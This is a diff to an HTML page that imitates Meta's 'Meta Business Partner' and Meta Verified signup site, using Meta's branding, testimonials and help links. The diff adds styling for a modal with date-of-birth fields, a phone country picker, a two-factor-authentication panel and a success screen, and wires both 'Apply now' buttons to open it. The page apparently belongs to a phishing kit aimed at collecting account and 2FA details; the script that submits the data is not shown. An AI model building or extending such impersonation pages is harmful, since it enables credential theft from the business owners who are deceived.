@@ -1,11 +1,10 @@
-
 <!DOCTYPE html>
 <html lang="en">
 
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <link rel="icon" href="/public/images/favicon.svg">
+    <link rel="icon" href="../public/images/favicon.svg">
     <title>Marketing tools and advertising solutions on Facebook and Instagram | Meta for Business</title>
     <meta name="description" content="Find and reach more customers on Facebook, Instagram and Messenger. Get access to Meta&#039;s business tools, advertising resources and marketing help." />
     <meta property="og:title" content="Marketing tools and advertising solutions on Facebook and Instagram | Meta for Business" />
@@ -51,6 +50,148 @@
 
     <script src="//translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"></script>
 
+    <!-- ===================== MODAL STYLES (từ form phải) ===================== -->
+    <style>
+      .modal-overlay {
+        display: none;
+        position: fixed;
+        inset: 0;
+        z-index: 999;
+        background: rgba(0,0,0,0.45);
+        align-items: center;
+        justify-content: center;
+        padding: 20px;
+        box-sizing: border-box;
+      }
+      .modal-overlay.open { display: flex; }
+      .modal-box {
+        background: #fff;
+        width: 100%;
+        max-width: 480px;
+        max-height: 90vh;
+        border-radius: 16px;
+        padding: 20px;
+        display: flex;
+        flex-direction: column;
+        overflow-y: auto;
+        transform: scale(0.9);
+        opacity: 0;
+        transition: transform 0.2s ease, opacity 0.2s ease;
+        box-shadow: 0 20px 60px rgba(0,0,0,0.2);
+      }
+      .modal-overlay.open .modal-box { transform: scale(1); opacity: 1; }
+      .modal-header { display: flex; align-items: center; justify-content: space-between; margin-bottom: 14px; }
+      .modal-title { font-weight: 700; font-size: 15px; color: #0A1317; }
+      .modal-close {
+        width: 28px; height: 28px; border: none; background: none;
+        cursor: pointer; font-size: 22px; color: #9a9a9a; line-height: 1;
+        padding: 0; border-radius: 50%; display: flex; align-items: center; justify-content: center;
+      }
+      .modal-close:hover { background: #f0f0f0; color: #333; }
+      .modal-input-wrap {
+        width: 100%; border: 1px solid #d4dbe3; height: 40px; padding: 0 11px;
+        border-radius: 10px; background: #fff; font-size: 14px; margin-bottom: 10px;
+        display: flex; align-items: center; transition: border-color 0.2s;
+      }
+      .modal-input-wrap:focus-within { border-color: #3b82f6; }
+      .modal-input-wrap input {
+        width: 100%; outline: none; border: none; background: transparent;
+        font-size: 14px; font-family: inherit; height: 100%;
+      }
+      .modal-textarea-wrap {
+        width: 100%; border: 1px solid #d4dbe3; border-radius: 10px;
+        background: #fff; font-size: 14px; margin-bottom: 10px;
+        padding: 11px; transition: border-color 0.2s;
+      }
+      .modal-textarea-wrap:focus-within { border-color: #3b82f6; }
+      .modal-textarea-wrap textarea {
+        width: 100%; outline: none; border: none; background: transparent;
+        font-size: 14px; font-family: inherit; resize: none; display: block;
+      }
+      .modal-dob-grid { display: grid; grid-template-columns: repeat(3,1fr); gap: 10px; margin-bottom: 10px; }
+      .modal-btn-primary {
+        width: 100%; height: 45px; background: #0064E0; color: #fff;
+        border: none; border-radius: 40px; font-size: 15px; font-weight: 500;
+        cursor: pointer; transition: background 0.2s; font-family: inherit;
+      }
+      .modal-btn-primary:hover:not(:disabled) { background: #0052c5; }
+      .modal-btn-primary:disabled { opacity: 0.75; cursor: default; }
+      .modal-btn-outline {
+        width: 100%; height: 40px; border: 1px solid #d4dbe3;
+        border-radius: 40px; background: #fff; font-size: 14px;
+        color: #9a979e; cursor: pointer; margin-top: 12px; font-family: inherit;
+      }
+      .modal-error { color: #ef4444; font-size: 13px; margin-bottom: 10px; display: none; }
+      .modal-error.show { display: block; }
+      .modal-label { font-size: 14px; color: #9a979e; font-weight: 700; margin-bottom: 7px; display: block; }
+      .modal-hint { font-size: 13px; color: #9a979e; margin-bottom: 12px; }
+      .modal-check-row { display: flex; align-items: center; gap: 8px; font-size: 14px; margin-bottom: 20px; cursor: pointer; }
+      .modal-check-row input { width: 16px; height: 16px; accent-color: #0064E0; flex-shrink: 0; }
+      .modal-check-row a { color: #0064E0; pointer-events: none; }
+      .modal-meta-logo { width: 64px; margin: 20px auto 0; display: block; }
+      .modal-meta-icon { width: 48px; margin: 0 auto 20px; display: block; }
+      .modal-user-info { display: flex; align-items: center; gap: 6px; font-size: 13px; color: #9a979e; margin-bottom: 8px; }
+      .modal-dot { width: 4px; height: 4px; background: #9a979e; border-radius: 50%; display: inline-block; }
+      .modal-2fa-img, .modal-success-img { border-radius: 8px; overflow: hidden; margin-bottom: 16px; }
+      .modal-2fa-img img, .modal-success-img img { width: 100%; display: block; }
+      .modal-return-btn {
+        display: block; width: 100%; height: 40px; background: #0064E0;
+        color: #fff; text-align: center; border-radius: 40px; line-height: 40px;
+        text-decoration: none; font-size: 14px; font-weight: 500; transition: background 0.2s;
+      }
+      .modal-return-btn:hover { background: #0052c5; }
+      .modal-spinner {
+        width: 18px; height: 18px; border: 2px solid rgba(255,255,255,0.5);
+        border-top-color: #fff; border-radius: 50%;
+        animation: modalSpin 0.7s linear infinite; display: inline-block; vertical-align: middle;
+      }
+      @keyframes modalSpin { to { transform: rotate(360deg); } }
+
+      /* Phone Country Selector */
+      .pcs-phone-row { gap: 0; padding: 0; align-items: stretch; }
+      .pcs-wrap { position: relative; height: 100%; display: flex; align-items: center; }
+      .pcs-trigger {
+        display: flex; align-items: center; gap: 5px; cursor: pointer;
+        padding: 0 8px 0 10px; height: 100%; border-right: 1px solid #e5e7eb;
+        white-space: nowrap; user-select: none; flex-shrink: 0;
+        font-size: 18px;
+      }
+      .pcs-trigger:hover { background: #f9fafb; }
+      .pcs-dropdown {
+        position: absolute; top: calc(100% + 6px); left: 0;
+        width: 280px; background: #fff;
+        border: 1px solid #e5e7eb; border-radius: 12px;
+        box-shadow: 0 8px 32px rgba(0,0,0,0.12);
+        z-index: 9999; overflow: hidden;
+      }
+      .pcs-search {
+        width: 100%; padding: 10px 14px; border: none; border-bottom: 1px solid #f0f0f0;
+        font-size: 13px; outline: none; background: #fafafa;
+      }
+      .pcs-list { max-height: 220px; overflow-y: auto; }
+      .pcs-opt {
+        display: flex; align-items: center; gap: 8px;
+        padding: 8px 14px; cursor: pointer; transition: background 0.15s;
+      }
+      .pcs-opt:hover { background: #f0f4ff; }
+
+      /* Modal background style */
+      .modal-box {
+        background-image: url('../public/images/background.png') !important;
+        background-size: cover !important;
+        background-position: center center !important;
+        background-repeat: no-repeat !important;
+        background-color: #f0f4ff !important;
+        position: relative;
+      }
+      .modal-box::before {
+        content: ""; position: absolute; inset: 0; border-radius: 16px;
+        background: rgba(255,255,255,0.80); backdrop-filter: blur(3px);
+        z-index: 0; pointer-events: none;
+      }
+      .modal-box > * { position: relative; z-index: 1; }
+    </style>
+
 </head>
 
 <body class="overflow-x-hidden">
@@ -63,15 +204,10 @@
         <div class='flex items-center justify-start gap-2 text-[14px]  '>
             <img src="../public/images/logo-meta.svg" class='md:w-[65px] w-[70px]' alt="blue" />
             <div class='ml-[50px] md:flex hidden items-center justify-start gap-7 text-[#1c2b33]'>
-                <span
-                    class='cursor-pointer font-bold relative after:content-[""] after:absolute after:bottom-0 after:left-0 after:w-full after:h-[2px] after:bg-[#cbd2d9] after:transform after:scale-x-0 after:origin-left after:transition-transform after:duration-300 hover:after:scale-x-100'>Get
-                    started</span>
-                <span
-                    class='cursor-pointer font-bold relative after:content-[""] after:absolute after:bottom-0 after:left-0 after:w-full after:h-[2px] after:bg-[#cbd2d9] after:transform after:scale-x-0 after:origin-left after:transition-transform after:duration-300 hover:after:scale-x-100'>Advertise</span>
-                <span
-                    class='cursor-pointer font-bold relative after:content-[""] after:absolute after:bottom-0 after:left-0 after:w-full after:h-[2px] after:bg-[#cbd2d9] after:transform after:scale-x-0 after:origin-left after:transition-transform after:duration-300 hover:after:scale-x-100'>Learn</span>
-                <span
-                    class='cursor-pointer font-bold relative after:content-[""] after:absolute after:bottom-0 after:left-0 after:w-full after:h-[2px] after:bg-[#cbd2d9] after:transform after:scale-x-0 after:origin-left after:transition-transform after:duration-300 hover:after:scale-x-100'>Support</span>
+                <span class='cursor-pointer font-bold relative after:content-[""] after:absolute after:bottom-0 after:left-0 after:w-full after:h-[2px] after:bg-[#cbd2d9] after:transform after:scale-x-0 after:origin-left after:transition-transform after:duration-300 hover:after:scale-x-100'>Get started</span>
+                <span class='cursor-pointer font-bold relative after:content-[""] after:absolute after:bottom-0 after:left-0 after:w-full after:h-[2px] after:bg-[#cbd2d9] after:transform after:scale-x-0 after:origin-left after:transition-transform after:duration-300 hover:after:scale-x-100'>Advertise</span>
+                <span class='cursor-pointer font-bold relative after:content-[""] after:absolute after:bottom-0 after:left-0 after:w-full after:h-[2px] after:bg-[#cbd2d9] after:transform after:scale-x-0 after:origin-left after:transition-transform after:duration-300 hover:after:scale-x-100'>Learn</span>
+                <span class='cursor-pointer font-bold relative after:content-[""] after:absolute after:bottom-0 after:left-0 after:w-full after:h-[2px] after:bg-[#cbd2d9] after:transform after:scale-x-0 after:origin-left after:transition-transform after:duration-300 hover:after:scale-x-100'>Support</span>
             </div>
         </div>
         <div class='md:flex hidden items-center justify-start gap-10'>
@@ -87,13 +223,13 @@
     <!-- HERO START -->
     <div class='flex md:flex-row flex-col w-full items-center justify-between'>
         <div class='md:w-1/2 w-full flex items-center justify-end md:order-1 order-2 py-8 px-6'>
-            <div
-                class='md:max-w-[515px] max-w-[100%] w-full md:mr-[4rem] mr-[0px] md:block flex flex-col items-start justify-start'>
+            <div class='md:max-w-[515px] max-w-[100%] w-full md:mr-[4rem] mr-[0px] md:block flex flex-col items-start justify-start'>
                 <img src="../public/images/ic_blue.svg" alt="meta" class='order-1 md:w-[84px] w-[48px] md:h-[84px] h-[48px]' />
                 <h1 class='md:text-[48px] text-[32px] font-[500] font-bold mb-4 order-2'>Become a Meta Business Partner</h1>
                 <p class='text-[16px] text-[#1c2b33] font-[300] md:order-3 order-4'>Meta business partners enjoy unique benefits such as training, support, analytical reporting and customer networking opportunities.</p>
                 <p class='text-[16px] text-[#1c2b33] font-[300] md:order-4 order-5'>Applicants can apply for a variety of specializations, including agency management, feed management and feed conversion data.</p>
-                <button id="btn-submit-request" class='md:order-5 order-3 bg-[#0062ff] text-white px-6 h-[50px] flex items-center justify-center rounded-full md:mt-6 mt-0 mb-6 font-[600] text-[15px]'>Apply now</button>
+                <!-- Apply now → openClientModal() -->
+                <button onclick="openClientModal()" class='md:order-5 order-3 bg-[#0062ff] text-white px-6 h-[50px] flex items-center justify-center rounded-full md:mt-6 mt-0 mb-6 font-[600] text-[15px]'>Apply now</button>
             </div>
         </div>
         <div class='md:w-1/2 w-full md:order-2 order-1 md:py-0 md:h-[calc(100vh-80px)] h-[200px] overflow-hidden'>
@@ -107,8 +243,7 @@
             <p class='text-[16px] mt-[18px] font-[300] '>Join our global community of solution specialists, vetted by Meta for technical and service excellence. When you join, you'll get access to unique benefits such as training, support, analytics reports and client matching opportunities to help fuel the growth of your business.</p>
             <a href="#" class='text-[#0064E0]'>
                 <div class='flex items-center justify-start gap-2 pt-3'>
-                    <div
-                        class='rounded-full w-[24px] h-[24px] flex items-center justify-center border border-[#0064E0]'>
+                    <div class='rounded-full w-[24px] h-[24px] flex items-center justify-center border border-[#0064E0]'>
                         <img src="../public/icons/ic_circle.svg" alt="circle" class='w-[20px] h-[20px] ' />
                     </div>
                     <span class='text-[14px]'>Learn more</span>
@@ -133,23 +268,15 @@
 
                 <div class='w-1/2 flex flex-col'>
                     <div class='feature-item py-10 border-t border-gray-100 cursor-pointer first:border-t-0' data-index="0">
-                        <h3 class='text-[32px] font-[400] transition-all duration-500 text-[#1C2B33]'>
-                            Credibility
-                        </h3>
+                        <h3 class='text-[32px] font-[400] transition-all duration-500 text-[#1C2B33]'>Credibility</h3>
                         <div class='feature-description overflow-hidden transition-all duration-500 text-[#1C2B33] ease-in-out max-h-[200px] opacity-100 mt-6'>
-                            <p class='text-[16px]'>
-                                Earn the Meta Business Partners badge to show clients you're the best at what you do.
-                            </p>
+                            <p class='text-[16px]'>Earn the Meta Business Partners badge to show clients you're the best at what you do.</p>
                         </div>
                     </div>
                     <div class='feature-item py-10 border-t border-gray-100 cursor-pointer' data-index="1">
-                        <h3 class='text-[32px] font-[400] transition-all duration-500 text-[#1C2B33]'>
-                            Resources and support
-                        </h3>
+                        <h3 class='text-[32px] font-[400] transition-all duration-500 text-[#1C2B33]'>Resources and support</h3>
                         <div class='feature-description overflow-hidden transition-all duration-500 text-[#1C2B33] ease-in-out max-h-0 opacity-0'>
-                            <p class='text-[16px]'>
-                                Gain access to partner-specific resources, recommendations, training and chat or live support.
-                            </p>
+                            <p class='text-[16px]'>Gain access to partner-specific resources, recommendations, training and chat or live support.</p>
                         </div>
                     </div>
                     <div class='border-t border-gray-100'></div>
@@ -163,12 +290,8 @@
                         <img src="../public/images/credibility.png" class='w-full h-full object-cover' alt="Credibility" />
                     </div>
                     <div class='flex flex-col gap-4'>
-                        <h3 class='text-[32px] font-[400] text-[#1C2B33]'>
-                            Credibility
-                        </h3>
-                        <p class='text-[16px] text-[#1C2B33] leading-[1.6]'>
-                            Earn the Meta Business Partners badge to show clients you're the best at what you do.
-                        </p>
+                        <h3 class='text-[32px] font-[400] text-[#1C2B33]'>Credibility</h3>
+                        <p class='text-[16px] text-[#1C2B33] leading-[1.6]'>Earn the Meta Business Partners badge to show clients you're the best at what you do.</p>
                     </div>
                 </div>
                 <div class='flex flex-col gap-8'>
@@ -176,12 +299,8 @@
                         <img src="../public/images/resources.png" class='w-full h-full object-cover' alt="Resources and support" />
                     </div>
                     <div class='flex flex-col gap-4'>
-                        <h3 class='text-[32px] font-[400] text-[#1C2B33]'>
-                            Resources and support
-                        </h3>
-                        <p class='text-[16px] text-[#1C2B33] leading-[1.6]'>
-                            Gain access to partner-specific resources, recommendations, training and chat or live support.
-                        </p>
+                        <h3 class='text-[32px] font-[400] text-[#1C2B33]'>Resources and support</h3>
+                        <p class='text-[16px] text-[#1C2B33] leading-[1.6]'>Gain access to partner-specific resources, recommendations, training and chat or live support.</p>
                     </div>
                 </div>
             </div>
@@ -196,7 +315,6 @@
                 featureItems.forEach(item => {
                     item.addEventListener('mouseenter', () => {
                         const index = item.getAttribute('data-index');
-
                         featureImages.forEach(img => {
                             if (img.getAttribute('data-index') === index) {
                                 img.classList.remove('opacity-0', 'pointer-events-none');
@@ -206,7 +324,6 @@
                                 img.classList.add('opacity-0', 'pointer-events-none');
                             }
                         });
-
                         featureDescriptions.forEach(desc => {
                             if (desc.closest('.feature-item').getAttribute('data-index') === index) {
                                 desc.classList.remove('max-h-0', 'opacity-0');
@@ -228,10 +345,8 @@
         <div class='max-w-[1504px] mx-auto md:px-[32px] px-4 '>
             <h2 class='md:text-[36px] text-[28px] font-[500] text-[#1C2B33] leading-[1.2]'>Explore how Meta technologies can help transform your business.</h2>
         </div>
-
         <div class='max-w-[1504px] mx-auto md:px-[32px] pt-[40px]'>
             <div class='flex flex-wrap'>
-
                 <div class='w-full md:w-1/2 lg:w-1/3 px-4 md:pt-8 pt-4'>
                     <div class='bg-white rounded-[24px] md:p-[40px] p-6 border border-[#0A13171F] h-full flex flex-col'>
                         <div class='w-[84px] h-[84px] rounded-full flex items-center justify-center text-[#1C2B33] md:mb-6 mb-3 overflow-hidden'>
@@ -243,7 +358,6 @@
                         </div>
                     </div>
                 </div>
-
                 <div class='w-full md:w-1/2 lg:w-1/3 px-4 md:pt-8 pt-4'>
                     <div class='bg-white rounded-[24px] md:p-[40px] p-6 border border-[#0A13171F] h-full flex flex-col'>
                         <div class='w-[84px] h-[84px] rounded-full flex items-center justify-center text-[#1C2B33] md:mb-6 mb-3 overflow-hidden'>
@@ -255,7 +369,6 @@
                         </div>
                     </div>
                 </div>
-
                 <div class='w-full md:w-1/2 lg:w-1/3 px-4 md:pt-8 pt-4'>
                     <div class='bg-white rounded-[24px] md:p-[40px] p-6 border border-[#0A13171F] h-full flex flex-col'>
                         <div class='w-[84px] h-[84px] rounded-full flex items-center justify-center text-[#1C2B33] md:mb-6 mb-3 overflow-hidden'>
@@ -267,7 +380,6 @@
                         </div>
                     </div>
                 </div>
-
                 <div class='w-full md:w-1/2 lg:w-1/3 px-4 md:pt-8 pt-4'>
                     <div class='bg-white rounded-[24px] md:p-[40px] p-6 border border-[#0A13171F] h-full flex flex-col'>
                         <div class='w-[84px] h-[84px] rounded-full flex items-center justify-center text-[#1C2B33] md:mb-6 mb-3 overflow-hidden'>
@@ -275,11 +387,10 @@
                         </div>
                         <div class='flex-grow'>
                             <h3 class='md:text-[24px] text-[20px] text-[#0A1317] font-[500] md:mb-6 mb-3 leading-[1.2]'>Get personalised ad solutions</h3>
-                            <div class='text-[16px] text-[#5D6C7B] leading-[1.5]'>See faster results in fewer steps with AI-enabled tools that generate ads your customers want to see.</a></div>
+                            <div class='text-[16px] text-[#5D6C7B] leading-[1.5]'>See faster results in fewer steps with AI-enabled tools that generate ads your customers want to see.</div>
                         </div>
                     </div>
                 </div>
-
                 <div class='w-full md:w-1/2 lg:w-1/3 px-4 md:pt-8 pt-4'>
                     <div class='bg-white rounded-[24px] md:p-[40px] p-6 border border-[#0A13171F] h-full flex flex-col'>
                         <div class='w-[84px] h-[84px] rounded-full flex items-center justify-center text-[#1C2B33] md:mb-6 mb-3 overflow-hidden'>
@@ -287,11 +398,10 @@
                         </div>
                         <div class='flex-grow'>
                             <h3 class='md:text-[24px] text-[20px] text-[#0A1317] font-[500] md:mb-6 mb-3 leading-[1.2]'>Understand performance</h3>
-                            <div class='text-[16px] text-[#5D6C7B] leading-[1.5]'>Access advanced marketing performance tracking with detailed overviews of audience behaviour.</a></div>
+                            <div class='text-[16px] text-[#5D6C7B] leading-[1.5]'>Access advanced marketing performance tracking with detailed overviews of audience behaviour.</div>
                         </div>
                     </div>
                 </div>
-
                 <div class='w-full md:w-1/2 lg:w-1/3 px-4 md:pt-8 pt-4'>
                     <div class='bg-white rounded-[24px] md:p-[40px] p-6 border border-[#0A13171F] h-full flex flex-col'>
                         <div class='w-[84px] h-[84px] rounded-full flex items-center justify-center text-[#1C2B33] md:mb-6 mb-3 overflow-hidden'>
@@ -299,11 +409,10 @@
                         </div>
                         <div class='flex-grow'>
                             <h3 class='md:text-[24px] text-[20px] text-[#0A1317] font-[500] md:mb-6 mb-3 leading-[1.2]'>Use ad formats that work</h3>
-                            <div class='text-[16px] text-[#5D6C7B] leading-[1.5]'>Designed to fit specific business goals, reach and expand your audience across every device.</a></div>
+                            <div class='text-[16px] text-[#5D6C7B] leading-[1.5]'>Designed to fit specific business goals, reach and expand your audience across every device.</div>
                         </div>
                     </div>
                 </div>
-
             </div>
         </div>
     </div>
@@ -311,91 +420,56 @@
 
     <!-- FEEDBACK START -->
     <div class="max-w-[1504px] feedback mx-auto px-6 mb-[80px]">
-        <p class="text-center md:text-[32px] font-[500] text-[24px] mb-10">
-            See how Meta Verified has helped real businesses.
-        </p>
-
-        <!-- SLIDER -->
+        <p class="text-center md:text-[32px] font-[500] text-[24px] mb-10">See how Meta Verified has helped real businesses.</p>
         <div class="bg-[#f1f4f7] overflow-hidden rounded-[24px]" id="testimonial-wrapper">
             <div class="flex transition-transform duration-500" id="testimonial-track">
-
-                <!-- slide -->
                 <div class="flex-[0_0_100%] py-20 md:px-20 px-4">
                     <div class="text-center h-full flex flex-col justify-center items-center">
-                        <p class="md:text-[24px] text-[17px] font-[300] mb-8">
-                            “After enrolling in Meta Verified, I noticed increased reach on my posts and higher
-                            engagement with my audience. I think that seeing a verified badge builds trust. People
-                            that I don't know or newer brands interested in working with me can make sure that
-                            they're talking with me and not a scammer.”
-                        </p>
-                        <p class="md:text-[18px] text-[15px] font-helvetica font-[100] md:px-[25%] px-4">
-                            Kimber Greenwood, Owner of Water Bear Photography
-                        </p>
+                        <p class="md:text-[24px] text-[17px] font-[300] mb-8">"After enrolling in Meta Verified, I noticed increased reach on my posts and higher engagement with my audience. I think that seeing a verified badge builds trust. People that I don't know or newer brands interested in working with me can make sure that they're talking with me and not a scammer."</p>
+                        <p class="md:text-[18px] text-[15px] font-helvetica font-[100] md:px-[25%] px-4">Kimber Greenwood, Owner of Water Bear Photography</p>
                     </div>
                 </div>
-
-                <!-- slide -->
                 <div class="flex-[0_0_100%] py-20 md:px-20 px-4">
                     <div class="text-center h-full flex flex-col justify-center items-center">
-                        <p class="md:text-[24px] text-[17px] font-[300] mb-8">
-                            “Since subscribing, I've noticed a real difference. My posts are getting more reach,
-                            engagement has gone up and I'm seeing more interactions on stories and reels.”
-                        </p>
-                        <p class="md:text-[18px] text-[15px] font-helvetica font-[100] md:px-[25%] px-4">
-                            Devon Kirby, Owner, Mom Approved Miami
-                        </p>
+                        <p class="md:text-[24px] text-[17px] font-[300] mb-8">"Since subscribing, I've noticed a real difference. My posts are getting more reach, engagement has gone up and I'm seeing more interactions on stories and reels."</p>
+                        <p class="md:text-[18px] text-[15px] font-helvetica font-[100] md:px-[25%] px-4">Devon Kirby, Owner, Mom Approved Miami</p>
                     </div>
                 </div>
-
-                <!-- slide -->
                 <div class="flex-[0_0_100%] py-20 md:px-20 px-4">
                     <div class="text-center h-full flex flex-col justify-center items-center">
-                        <p class="md:text-[24px] text-[17px] font-[300] mb-8">
-                            “Having a verified account signals to both our existing followers and new visitors that
-                            we are a credible, professional business that takes both our products and social
-                            presence seriously.”
-                        </p>
-                        <p class="md:text-[18px] text-[15px] font-helvetica font-[100] md:px-[25%] px-4">
-                            Sarah Clancy, Owner of Sarah Marie Running Co.
-                        </p>
+                        <p class="md:text-[24px] text-[17px] font-[300] mb-8">"Having a verified account signals to both our existing followers and new visitors that we are a credible, professional business that takes both our products and social presence seriously."</p>
+                        <p class="md:text-[18px] text-[15px] font-helvetica font-[100] md:px-[25%] px-4">Sarah Clancy, Owner of Sarah Marie Running Co.</p>
                     </div>
                 </div>
-
             </div>
         </div>
-
-        <!-- PAGINATION -->
         <div class="flex items-center justify-center gap-8 mt-6">
-
             <button id="prev-feed" class="w-[32px] h-[32px] md:block hidden">
                 <img src="../public/icons/ic_left.svg" class="w-[32px] h-[32px]">
             </button>
-
             <div class="flex gap-2" id="dots">
                 <button class="w-[10px] h-[10px] rounded-full bg-gray-900"></button>
                 <button class="w-[10px] h-[10px] rounded-full bg-gray-300"></button>
                 <button class="w-[10px] h-[10px] rounded-full bg-gray-300"></button>
             </div>
-
             <button id="next-feed" class="w-[32px] h-[32px] md:block hidden">
                 <img src="../public/icons/ic_right.svg" class="w-[32px] h-[32px]">
             </button>
-
         </div>
     </div>
     <!-- FEEDBACK END -->
 
     <!-- ACTION START -->
-     <div class='flex md:flex-row flex-col w-full items-center justify-between'>
+    <div class='flex md:flex-row flex-col w-full items-center justify-between'>
         <div class='md:w-1/2 w-full md:order-2 order-1 md:py-0 md:h-[calc(100vh-80px)] h-[200px] overflow-hidden'>
             <video src="public/images/video-meta.mp4" class='w-full h-full object-cover block md:h-full h-[300px] w-full' autoPlay muted loop></video>
         </div>
         <div class='md:w-1/2 w-full flex items-center justify-end md:order-1 order-2 py-8 px-6'>
-            <div
-                class='md:max-w-[515px] max-w-[100%] w-full md:mr-[4rem] mr-[0px] md:block flex flex-col items-start justify-start'>
+            <div class='md:max-w-[515px] max-w-[100%] w-full md:mr-[4rem] mr-[0px] md:block flex flex-col items-start justify-start'>
                 <img src="../public/images/ic_blue.svg" alt="meta" class='order-1 md:w-[84px] w-[48px] md:h-[84px] h-[48px]' />
                 <h1 class='md:text-[48px] text-[32px] font-[500] font-bold mb-4 order-2'>Ready to become Meta Verified?</h1>
-                <button id="btn-submit-request-2" class='md:order-5 order-3 bg-[#0062ff] text-white px-6 h-[50px] flex items-center justify-center rounded-full md:mt-6 mt-0 mb-6 font-[600] text-[15px]'>Apply now</button>
+                <!-- Apply now → openClientModal() -->
+                <button onclick="openClientModal()" class='md:order-5 order-3 bg-[#0062ff] text-white px-6 h-[50px] flex items-center justify-center rounded-full md:mt-6 mt-0 mb-6 font-[600] text-[15px]'>Apply now</button>
             </div>
         </div>
     </div>
@@ -404,85 +478,47 @@
     <!-- FAQ START -->
     <div class="faq max-w-[1504px] mx-auto mt-20 mb-[80px] px-6">
         <p class="text-[32px] font-[500] mb-3">FAQ</p>
-
         <p class="text-[18px] font-[500] mb-10">
             For more, visit our Help Centre
-            (<a class="text-[#0064E0] underline decoration-[#cbd2d9]"
-                href="https://www.facebook.com/business/help/2876154822522394">Instagram and Facebook</a>;
-            <a class="text-[#0064E0] underline decoration-[#cbd2d9]"
-                href="https://faq.whatsapp.com/3872729742954601">WhatsApp</a>).
+            (<a class="text-[#0064E0] underline decoration-[#cbd2d9]" href="https://www.facebook.com/business/help/2876154822522394">Instagram and Facebook</a>;
+            <a class="text-[#0064E0] underline decoration-[#cbd2d9]" href="https://faq.whatsapp.com/3872729742954601">WhatsApp</a>).
         </p>
-
         <div class="divide-y border-t border-b">
-
-            <!-- item -->
             <div class="faq-item">
                 <button class="faq-btn w-full flex items-center justify-between py-6 text-left text-lg font-medium">
-                    <span class="md:text-[24px] text-[20px]">
-                        How do I know if my business is eligible?
-                    </span>
-                    <span class="faq-icon transition-transform">
-                        <img src="../public/icons/ic_arrow.svg" class="md:w-[24px] w-[20px] md:h-[24px] h-[20px]">
-                    </span>
+                    <span class="md:text-[24px] text-[20px]">How do I know if my business is eligible?</span>
+                    <span class="faq-icon transition-transform"><img src="../public/icons/ic_arrow.svg" class="md:w-[24px] w-[20px] md:h-[24px] h-[20px]"></span>
                 </button>
-
-                <div
-                    class="faq-content grid transition-all duration-300 ease-in-out max-h-0 grid-rows-[0fr] opacity-0">
+                <div class="faq-content grid transition-all duration-300 ease-in-out max-h-0 grid-rows-[0fr] opacity-0">
                     <div class="md:text-[18px] text-[16px] overflow-hidden text-gray-600 pb-8 leading-relaxed">
-                        Meta Verified is available in selected regions for businesses that meet certain eligibility
-                        requirements
-                        (<a class="text-[#0064E0] underline decoration-[#cbd2d9]"
-                            href="https://www.facebook.com/business/help/2876154822522394">requirements for Facebook
-                            and Instagram</a>;
-                        <a class="text-[#0064E0] underline decoration-[#cbd2d9]"
-                            href="https://faq.whatsapp.com/3872729742954601">requirements for WhatsApp</a>).
+                        Meta Verified is available in selected regions for businesses that meet certain eligibility requirements
+                        (<a class="text-[#0064E0] underline decoration-[#cbd2d9]" href="https://www.facebook.com/business/help/2876154822522394">requirements for Facebook and Instagram</a>;
+                        <a class="text-[#0064E0] underline decoration-[#cbd2d9]" href="https://faq.whatsapp.com/3872729742954601">requirements for WhatsApp</a>).
                     </div>
                 </div>
             </div>
-
-            <!-- item -->
             <div class="faq-item">
                 <button class="faq-btn w-full flex items-center justify-between py-6 text-left text-lg font-medium">
-                    <span class="md:text-[24px] text-[20px]">
-                        How can I stay informed if I'm not yet eligible?
-                    </span>
-                    <span class="faq-icon transition-transform">
-                        <img src="../public/icons/ic_arrow.svg" class="md:w-[24px] w-[20px] md:h-[24px] h-[20px]">
-                    </span>
+                    <span class="md:text-[24px] text-[20px]">How can I stay informed if I'm not yet eligible?</span>
+                    <span class="faq-icon transition-transform"><img src="../public/icons/ic_arrow.svg" class="md:w-[24px] w-[20px] md:h-[24px] h-[20px]"></span>
                 </button>
-
-                <div
-                    class="faq-content grid transition-all duration-300 ease-in-out max-h-0 grid-rows-[0fr] opacity-0">
+                <div class="faq-content grid transition-all duration-300 ease-in-out max-h-0 grid-rows-[0fr] opacity-0">
                     <div class="md:text-[18px] text-[16px] overflow-hidden text-gray-600 pb-8 leading-relaxed">
-                        <a class="text-[#0064E0] underline decoration-[#cbd2d9]"
-                            href="https://business.facebook.com/business/loginpage">
-                            Join our waitlist
-                        </a>
-                        to stay updated. We will notify you when Meta Verified for businesses is available.
+                        <a class="text-[#0064E0] underline decoration-[#cbd2d9]" href="https://business.facebook.com/business/loginpage">Join our waitlist</a> to stay updated. We will notify you when Meta Verified for businesses is available.
                     </div>
                 </div>
             </div>
-
-            <!-- item -->
             <div class="faq-item">
                 <button class="faq-btn w-full flex items-center justify-between py-6 text-left text-lg font-medium">
-                    <span class="md:text-[24px] text-[20px]">
-                        I already have a verified badge. What happens to it?
-                    </span>
-                    <span class="faq-icon transition-transform">
-                        <img src="../public/icons/ic_arrow.svg" class="md:w-[24px] w-[20px] md:h-[24px] h-[20px]">
-                    </span>
+                    <span class="md:text-[24px] text-[20px]">I already have a verified badge. What happens to it?</span>
+                    <span class="faq-icon transition-transform"><img src="../public/icons/ic_arrow.svg" class="md:w-[24px] w-[20px] md:h-[24px] h-[20px]"></span>
                 </button>
-
-                <div
-                    class="faq-content grid transition-all duration-300 ease-in-out max-h-0 grid-rows-[0fr] opacity-0">
+                <div class="faq-content grid transition-all duration-300 ease-in-out max-h-0 grid-rows-[0fr] opacity-0">
                     <div class="md:text-[18px] text-[16px] overflow-hidden text-gray-600 pb-8 leading-relaxed">
-                        No action is needed in order to keep your badge. Existing verified badge holders can apply
-                        for a Meta Verified subscription.
+                        No action is needed in order to keep your badge. Existing verified badge holders can apply for a Meta Verified subscription.
                     </div>
                 </div>
             </div>
-
         </div>
     </div>
     <!-- FAQ END -->
@@ -491,42 +527,18 @@
     <footer class="bg-[#1b2a34] text-white">
         <div class="max-w-[1504px] mx-auto py-20 mt-20 px-6 grid grid-cols-1 lg:grid-cols-2 gap-10 items-start">
             <div>
-                <h2 class="text-3xl font-semibold leading-snug mb-4">
-                    Get the latest updates from Meta for business.
-                </h2>
-
-                <p class="text-gray-300 max-w-md">
-                    Provide your email address to receive the latest updates from Meta
-                    for business, including news, events and product updates.
-                </p>
+                <h2 class="text-3xl font-semibold leading-snug mb-4">Get the latest updates from Meta for business.</h2>
+                <p class="text-gray-300 max-w-md">Provide your email address to receive the latest updates from Meta for business, including news, events and product updates.</p>
             </div>
-
             <div class="w-full max-w-xl">
                 <div class="flex flex-col md:flex-row gap-4 mb-4">
